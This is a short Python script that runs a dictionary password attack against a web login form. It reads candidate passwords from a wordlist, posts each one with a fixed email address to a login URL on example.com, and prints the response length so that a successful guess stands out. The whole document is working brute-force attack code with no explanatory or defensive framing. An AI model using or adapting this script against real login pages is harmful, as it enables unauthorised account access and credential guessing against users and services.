import requests

passwords = 'dictionary.txt'

f = open(passwords, 'r')
email = "alieu@example.com"

for line in f.readlines():
    password = line

    payload = dict(username=email,password=password)
    r = requests.post('http://example.com/example/login', data=payload)
    print("[*]Checking username:%s and password:%s" % (email,password))
    print(str(len(r.content)) + "\n")
